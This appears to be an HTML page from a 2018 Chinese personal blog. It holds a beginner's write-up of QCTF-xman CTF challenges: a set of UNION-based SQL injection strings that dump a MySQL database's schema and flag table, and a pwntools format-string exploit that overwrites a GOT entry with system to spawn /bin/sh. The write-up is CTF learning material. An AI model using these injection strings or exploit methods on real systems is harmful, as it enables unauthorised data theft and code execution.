@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <meta name="description" content="如果你喜欢，就把这一切当作是荣耀，而不是炫耀--by 叶修" />
+  
+
+  
+  
+  
+  
+  
+  
+  <title>QCTF-xman | Invicsfate</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="周末试着尝试了一下QCTF-xman选拔赛的web题目和pwn题，萌新记录一下学习到的东西，毕竟还没入门的我是真的菜！ webNewsCenteremmmmm，第一次做web题目，用AWVS扫了一下，发现有sql注入漏洞，网页上仅有Search一个注入点，于是乎，开始学习如何进行sql注入。出现漏洞的网页是.php，后台服务器是appache，是个MySql的数据库。上网搜索到了如何查MySql数">
+<meta name="keywords" content="web,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="QCTF-xman">
+<meta property="og:url" content="http://Invicsfate.github.io/2018/07/16/QCTF-xman/index.html">
+<meta property="og:site_name" content="Invicsfate">
+<meta property="og:description" content="周末试着尝试了一下QCTF-xman选拔赛的web题目和pwn题，萌新记录一下学习到的东西，毕竟还没入门的我是真的菜！ webNewsCenteremmmmm，第一次做web题目，用AWVS扫了一下，发现有sql注入漏洞，网页上仅有Search一个注入点，于是乎，开始学习如何进行sql注入。出现漏洞的网页是.php，后台服务器是appache，是个MySql的数据库。上网搜索到了如何查MySql数">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-07-16T08:14:30.807Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="QCTF-xman">
+<meta name="twitter:description" content="周末试着尝试了一下QCTF-xman选拔赛的web题目和pwn题，萌新记录一下学习到的东西，毕竟还没入门的我是真的菜！ webNewsCenteremmmmm，第一次做web题目，用AWVS扫了一下，发现有sql注入漏洞，网页上仅有Search一个注入点，于是乎，开始学习如何进行sql注入。出现漏洞的网页是.php，后台服务器是appache，是个MySql的数据库。上网搜索到了如何查MySql数">
+  
+  
+    <link rel="icon" href="/css/images/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+  
+  <!-- baidu webmaster push -->
+  <script src='//push.zhanzhang.baidu.com/push.js'></script>
+</head>
+<body class="home blog custom-background custom-font-enabled single-author">
+  <div id="page" class="hfeed site">
+      <header id="masthead" class="site-header" role="banner">
+    <hgroup>
+      <h1 class="site-title">
+        <a href="/" title="Invicsfate" rel="home">Invicsfate</a>
+      </h1>
+      
+        <h2 class="site-description">
+          <a href="/" id="subtitle">bin选手一只，爱好二次元，最爱小姐姐(*^﹏^*)!</a>
+        </h2>
+      
+    </hgroup>
+
+    <nav id="site-navigation" class="main-navigation" role="navigation">
+            <button class="menu-toggle">菜单</button>
+            <a class="assistive-text" href="/#content" title="跳至内容">跳至内容</a><!--TODO-->
+            <div class="menu-main-container">
+                <ul id="menu-main" class="nav-menu">
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/">Home</a></li>
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/archives">Archives</a></li>
+                
+                </ul>
+            </div>
+    </nav>
+</header>
+      <div id="main" class="wrapper">
+        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-QCTF-xman" class="post-QCTF-xman post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title article-title">
+      QCTF-xman
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/07/16/QCTF-xman/" data-id="cjjnztsds0004783k28dghv2l" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <p>周末试着尝试了一下QCTF-xman选拔赛的web题目和pwn题，萌新记录一下学习到的东西，毕竟还没入门的我是真的菜！</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h3><p>emmmmm，第一次做web题目，用AWVS扫了一下，发现有sql注入漏洞，网页上仅有Search一个注入点，于是乎，开始学习如何进行sql注入。出现漏洞的网页是.php，后台服务器是appache，是个MySql的数据库。上网搜索到了如何查MySql数据库的库名，表名，字段名，由于第一次做web，还是需要记录一下操作过程的，网页没有过滤任何字符：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' union SELECT 1,2,schema_name FROM information_schema.SCHEMATA</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span> union SELECT 1,table_schema,table_name FROM information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">"news"</span> <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="string">' union SELECT table_name,column_name,data_type FROM information_schema.columns where table_name="secret_table" #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span> union SELECT 1,id,fl4g FROM news.secret_table <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>即可得到flag:QCTF{sq1_inJec7ion_ezzzzzz}</p>
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="notebook"><a href="#notebook" class="headerlink" title="notebook"></a>notebook</h3><p>第一次做格式化字符串漏洞，可以说还是踩了不少坑。<br>程序流程：</p>
+<ol>
+<li>sprintf输入到另外一个buffer中，对长度进行了校验。</li>
+<li>printf(buffer)</li>
+</ol>
+<p>对于1中，需要知道两个”%%”在sprintf以后会成为一个”%”，对于%%n$hhn在sprintf以后就能恢复为%n$hhn，减少的%个数，可以通过在构造的输入末尾加上相应长度的字符串绕过长度校验，比如在最后加上%nc。</p>
+<p>对于2中，需要知道格式化字符串漏洞的基本原理以及利用方式，主要有以下几点是格式化字符串中常用的方法和点：</p>
+<ol>
+<li>%n,%hn,%hhn 改写4字节，2字节，1字节</li>
+<li>%n$ 选中printf类函数的第n+1个参数</li>
+<li>通常以下构造格式较为通用：[打印字符数量]+[改写位置]+address</li>
+<li>确定改写首位置：找到调用printf类函数时，改写首位置n = 当前栈顶与buffer之间的距离/4</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更正思路,修改strlen函数got表-&gt;system，输入/bin/sh，直接调用</span></span><br><span class="line"><span class="comment"># 0x0804A038 -&gt; 080485C0</span></span><br><span class="line"><span class="comment"># payload1 = p32(0x0804A03A)+"%%14$hhn%%4c%%20$hhn"+p32(0x0804A03B)+"22%%119c%%25$hhn"+p32(0x0804A039)+"%%55c%%30$hhn222"+p32(0x0804A038)+"%11c"</span></span><br><span class="line"><span class="comment"># payload2 = "2222"+"%%17$hhn"+p32(0x0804A03A)+"%%20$hhn"+p32(0x0804A03B)+"%%119c"+"22"+"%%25$hhn"+p32(0x0804A039)+"222"+"%%52c"+"%%30$hhn"+p32(0x0804A038)+"%10c"</span></span><br><span class="line"><span class="comment"># QCTF&#123;f0rmat_s7r1ng_is_happy_&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwnIt</span><span class="params">()</span>:</span></span><br><span class="line">	p = process(<span class="string">"./notebook"</span>)</span><br><span class="line"><span class="comment">#	gdb.attach(p)</span></span><br><span class="line">	p.recvuntil(<span class="string">"May I have your name?\n"</span>)</span><br><span class="line">	payload = p32(<span class="number">0x0804A03A</span>)+<span class="string">"%%14$hhn%%4c%%20$hhn"</span>+p32(<span class="number">0x0804A03B</span>)+<span class="string">"22%%119c%%25$hhn"</span>+p32(<span class="number">0x0804A039</span>)+<span class="string">"%%55c%%30$hhn222"</span>+p32(<span class="number">0x0804A038</span>)+<span class="string">"%11c"</span>			p.sendline(payload)</span><br><span class="line">	p.recvuntil(<span class="string">"on the notebook?\n"</span>)</span><br><span class="line">	p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">	pwnIt()</span><br></pre></td></tr></table></figure>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2018/07/16/QCTF-xman/">
+    <time datetime="2018-07-16T07:20:34.000Z" class="entry-date">
+        2018-07-16
+    </time>
+</a>
+    
+  <span class="article-delim">&#8226;</span>
+  <div class="article-category">
+  <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </div>
+
+    
+  <span class="article-delim">&#8226;</span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/">web</a></li></ul>
+
+    </footer>
+</article>
+
+
+    
+<nav class="nav-single">
+    <h3 class="assistive-text">文章导航</h3>
+    
+    
+        <span class="nav-next"><a href="/2018/07/11/WCTF2018/" rel="next">WCTF2018 <span class="meta-nav">→</span></a></span>
+    
+</nav><!-- .nav-single -->
+
+
+
+
+
+
+
+</div></div>
+        <div id="secondary" class="widget-area" role="complementary">
+  
+    <aside id="search" class="widget widget_search"><form role="search" method="get" accept-charset="utf-8" id="searchform" class="searchform" action="//google.com/search">
+    <div>
+        <input type="text" value="" name="s" id="s" />
+        <input type="submit" id="searchsubmit" value="搜索" />
+    </div>
+</form></aside>
+  
+    
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget-content">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Python/">Python</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/XCTF2018/">XCTF2018</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/hctf/">hctf</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具/">工具</a><span class="category-list-count">6</span></li></ul>
+    </div>
+  </aside>
+
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget-content">
+      <ul>
+        
+          <li>
+            <a href="/2018/07/16/QCTF-xman/">QCTF-xman</a>
+          </li>
+        
+          <li>
+            <a href="/2018/07/11/WCTF2018/">WCTF2018</a>
+          </li>
+        
+          <li>
+            <a href="/2018/05/29/setUnhandleExceptionFilter-exploration/">setUnhandleExceptionFilter-exploration</a>
+          </li>
+        
+          <li>
+            <a href="/2018/04/13/HITBCTF2018-reverse-hex/">HITBCTF2018-reverse-hex</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/20/Play-Rtsp-Stream-opencv2/">Play Rtsp Stream-opencv2</a>
+          </li>
+        
+      </ul>
+    </div>
+  </aside>
+
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-content">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Git/">Git</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PIL/">PIL</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnable-tw/">pwnable.tw</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rev/">rev</a><span class="tag-list-count">10</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reversing-kr/">reversing.kr</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/">web</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windbg/">windbg</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/其他/">其他</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/工具/">工具</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/杂谈/">杂谈</a><span class="tag-list-count">3</span></li></ul>
+    </div>
+  </aside>
+
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-content tagcloud">
+      <a href="/tags/CTF/" style="font-size: 16.67px;">CTF</a> <a href="/tags/Git/" style="font-size: 10px;">Git</a> <a href="/tags/PIL/" style="font-size: 10px;">PIL</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/pwnable-tw/" style="font-size: 10px;">pwnable.tw</a> <a href="/tags/rev/" style="font-size: 20px;">rev</a> <a href="/tags/reversing-kr/" style="font-size: 10px;">reversing.kr</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/windbg/" style="font-size: 10px;">windbg</a> <a href="/tags/其他/" style="font-size: 10px;">其他</a> <a href="/tags/工具/" style="font-size: 10px;">工具</a> <a href="/tags/杂谈/" style="font-size: 13.33px;">杂谈</a>
+    </div>
+  </aside>
+
+  
+</div>
+      </div>
+      <footer id="colophon" role="contentinfo">
+    <p>&copy; 2018 Invicsfate
+    All rights reserved.</p>
+    <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</footer>
+    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+<script src="/js/navigation.js"></script>
+
+<div id="bg"></div>
+
+  </div>
+</body>
+</html>
